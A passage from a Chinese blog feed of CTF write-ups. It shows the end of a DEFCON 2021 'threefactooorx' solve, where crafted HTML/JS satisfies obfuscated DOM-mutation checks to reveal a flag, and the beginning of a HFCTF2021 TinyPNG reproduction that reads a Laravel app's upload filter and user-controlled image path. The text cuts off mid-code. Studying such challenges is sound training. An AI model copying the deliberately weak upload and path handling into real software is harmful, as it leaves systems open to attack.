punctuation">]</span><span class="token punctuation">,</span>                console<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"flag: "</span> <span class="token operator">+</span> _0x336e82<span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// four &amp;&amp; and display flag on the #thirdfactooor</span>            nodesadded <span class="token operator">==</span> <span class="token number">5</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>nodesdeleted <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> \            attrcharsadded <span class="token operator">==</span> <span class="token number">23</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>domvalue <span class="token operator">==</span> <span class="token number">2188</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> \             <span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"thirdfactooor"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span> <span class="token operator">=</span> _0x336e82<span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// append new div</span>            <span class="token keyword">const</span> _0x369bcb <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            _0x369bcb<span class="token punctuation">[</span><span class="token string">"setAttribute"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"processed"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                document<span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x369bcb<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中这个 <code>document[&quot;getElementById&quot;](&quot;thirdfactooor&quot;)</code> 是在 <code>check_dom()</code> 会进行的一项检查，我们需要让 html 中有一个 id 为 <code>thirdfactooor</code> 的 <code>input</code> 标签。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">[</span><span class="token string">"querySelector"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"thirdfactooor"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"tagName"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"INPUT"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只需要满足</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">nodesadded <span class="token operator">==</span> <span class="token number">5</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>nodesdeleted <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> attrcharsadded <span class="token operator">==</span> <span class="token number">23</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>domvalue <span class="token operator">==</span> <span class="token number">2188</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>依次找到赋值的地方</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* > _0x8a010b instanceof MutationRecord &lt;· true*/</span><span class="token keyword">if</span> <span class="token punctuation">(</span>_0x8a010b<span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"childList"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// never execute</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        nodesadded <span class="token operator">+=</span> _0x8a010b<span class="token punctuation">[</span><span class="token string">"addedNodes"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        nodesdeleted <span class="token operator">+=</span> _0x8a010b<span class="token punctuation">[</span><span class="token string">"removedNodes"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_0x8a010b<span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"attributes"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            attrcharsadded <span class="token operator">+=</span> _0x8a010b<span class="token punctuation">[</span><span class="token string">"attributeName"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这里学习了一下 <code>MutationRecord</code> 的函数，<a href="https://www.javascripture.com/MutationRecord">MutationRecord JavaScript API</a>。 <code>type</code> 会随着不同的操作改变</p><ul><li>改变 <code>Node.childNodes</code> 时会变成 <code>childList</code></li><li>改变 <code>Element.attribute</code> 时会变成 <code>attributes</code></li></ul><p>按要求我们需要5次节点增加，3次节点移除，改变的属性名的长度总和为23。</p><p>需要注意的是，在这段赋值操作前，有一处判断会导致程序提前退出。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> _0x5b12b9 <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"3fa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_0x8a010b<span class="token punctuation">[</span><span class="token string">"target"</span><span class="token punctuation">]</span> <span class="token operator">===</span> _0x5b12b9<span class="token punctuation">)</span> <span class="token operator">||</span> \_0x8a010b<span class="token punctuation">[</span><span class="token string">"target"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"parentNode"</span><span class="token punctuation">]</span> <span class="token operator">===</span> _0x5b12b9 <span class="token operator">||</span> \_0x8a010b<span class="token punctuation">[</span><span class="token string">"target"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"parentNode"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"parentNode"</span><span class="token punctuation">]</span> <span class="token operator">===</span> _0x5b12b9<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以 id 为 <code>#3fa</code> 的节点必须是根节点（可以直接给 <code>&lt;html&gt;</code> ）。</p><p>接下来在调试的时候观察到 <code>domvalue</code> 与 <code>.html</code> 文件中的字数有关，凑足一定的字数即可。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>thirdfactooor<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000px<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">let</span> fa <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"html"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    fa<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"3fa"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        fa<span class="token punctuation">.</span>lang <span class="token operator">=</span> i<span class="token punctuation">;</span> <span class="token comment">// 2 + 4 chars * 4 + 5</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> b <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> c <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> d <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> e <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>    fa<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接放在本地跑，成功</p><p><a href="https://cdn.jsdelivr.net/npm/4qe@0.0.2/poc.png"><img src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/poc.png" alt="poc" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/poc.png" class="lozad post-image"></a></p><h2 id="Capture-the-flag"><a href="#Capture-the-flag" class="headerlink" title="Capture the flag"></a>Capture the flag</h2><p>远程服务提供了一个 <code>/submit</code> 接口，可以提交我们的 html 文件，然后会用类似给这个 html “拍照”的方式，以图片格式返回。期间， html 文件里的 js 代码都会执行，但是 <code>alert()</code> 会引起报错，基本排除了 <code>XSS</code> 的可能。直接上传，DONE!</p><p><a href="https://cdn.jsdelivr.net/npm/4qe@0.0.2/successfully_done.png"><img src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/successfully_done.png" alt="successfully_done" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/successfully_done.png" class="lozad post-image"></a></p><p><a href="https://cdn.jsdelivr.net/npm/4qe@0.0.2/proof_of_solved.png"><img src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/proof_of_solved.png" alt="proof_of_solved" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.jsdelivr.net/npm/4qe@0.0.2/proof_of_solved.png" class="lozad post-image"></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DEFCON-2021-Quals-threefactooorx&quot;&gt;&lt;a href=&quot;#DEFCON-2021-Quals-threefactooorx&quot; class=&quot;headerlink&quot; title=&quot;DEFCON 2021 Quals threefacto</summary>
      
    
    
    
    
    <category term="CTF WriteUp" scheme="https://me.liki.link/tags/CTF-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF2021 TinyPNG 复现</title>
    <link href="https://me.liki.link/20210429/HFCTF2021-TinyPNG/"/>
    <id>https://me.liki.link/20210429/HFCTF2021-TinyPNG/</id>
    <published>2021-04-29T11:14:59.000Z</published>
    <updated>2021-05-18T11:55:25.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HFCTF2021-TinyPNG"><a href="#HFCTF2021-TinyPNG" class="headerlink" title="HFCTF2021 TinyPNG"></a>HFCTF2021 TinyPNG</h2><p>感谢 Naivekun 师傅的帮助</p><p>因为题目没有给全环境，所以自己 docker 搭了个环境，和 Buu 上的好像不太一样</p><p>docker 环境我会放在我的 GitHub 上，<a href="https://github.com/ChrisLiKaiyuan/HFCTF2021_TinyPNG">复现环境</a></p><h3 id="2021-05-18-更新："><a href="#2021-05-18-更新：" class="headerlink" title="2021-05-18 更新："></a><strong>2021-05-18 更新：</strong></h3><p>更新的部分，往下到结尾。</p><p>ZeddYu 师傅说将 HTTP2 走私的环境放到 GitHub 上了，<a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab">H2走私环境</a></p><h2 id="阅读源码"><a href="#阅读源码" class="headerlink" title="阅读源码"></a>阅读源码</h2><p>先阅读源码，搞清楚这个 Web 应用的具体功能和流程</p><p>Laravel 框架的默认路由位于 <code>routes/web.php</code> 下 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//...    </span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">IndexController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fileUpload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file.upload.post'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Don't expose the /image to others!</span><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name static-context">ImageController</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'handle'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image.handle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以很容易得到这个应用有三条路由</p><p>第一条路由是返回 <code>upload</code> 页面，视图文件位于 <code>resources/views/*</code></p><p>其他两条路由，分别看他们对应的类和方法，位于 <code>app/Http/Controllers/*</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># app/Http/Controllers/IndexController.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">fileUpload</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$req</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$allowed_extension</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">clientExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">===</span> <span class="token variable">$allowed_extension</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;\?|php|HALT\_COMPILER/i"</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Don\'t do that, please'</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token operator">-></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token function"><span class="token punctuation">\</span>md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">;</span>                <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">storePubliclyAs</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uploads'</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"path: <span class="token interpolation"><span class="token variable">$path</span></span>"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token operator">-></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'success'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'File has been uploaded.'</span><span class="token punctuation">)</span>                    <span class="token operator">-></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Don\'t do that, please'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token operator">-></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>IndexController</code> 的 <code>fileUpload</code> 方法实现了一个文件上传的功能</p><ul><li><p>上传的文件后缀名只能以 <code>.png</code> 结尾</p></li><li><p>上传的文件会被存储在 <code>public/uploads</code>文件夹内，文件名不可控，为 <code>\md5(time()) . &#39;.png&#39;</code></p></li><li><p>对 <code>&lt;?</code>、<code>php</code>、<code>HALT_COMPILER</code> 字符串进行了过滤</p></li><li><p>上传成功后会返回储存的路径</p></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"># app/Http/Controllers/ImageController.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ImageController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">handle</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$source</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Don\'t do that, pvlease'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token operator">-></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$image_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">;</span>            <span class="token variable">$dst_img</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/'</span> <span class="token operator">.</span> <span class="token variable">$image_name</span><span class="token punctuation">;</span>            <span class="token variable">$percent</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">imgcompress</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">,</span> <span class="token variable">$percent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">compressImg</span><span class="token punctuation">(</span><span class="token variable">$dst_img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">with</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image_name'</span><span class="token punctuation">,</span> <span class="token variable">$image_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>ImageController</code> 的 <code>handle</code> 方法实现了一个压缩图片的功能</p><ul><li><strong>实现了，但又没有完全实现</strong></li><li>读取 Request 中传入的 <code>image</code> 作为目标图片路径</li><li>读取该图片，调用 <code>imgcompress</code> 类中的 <code>compressImg</code> 方法对图片进行压缩</li><li>压缩完成后返回图片的路径</li></ul><p>在来看看调用的 <code>imgcompress</code> 类，因为比较长，所以截取关键部分贴上来</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># app/Http/Controllers/imgcompress.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">imgcompress</span><span class="token punctuation">&#123;</span><span class="token comment">//...</span>    <span class="token comment">/**     * 内部：打开图片     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">_openImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$attr</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">src</span><span class="token punctuation">)</span><span class="token 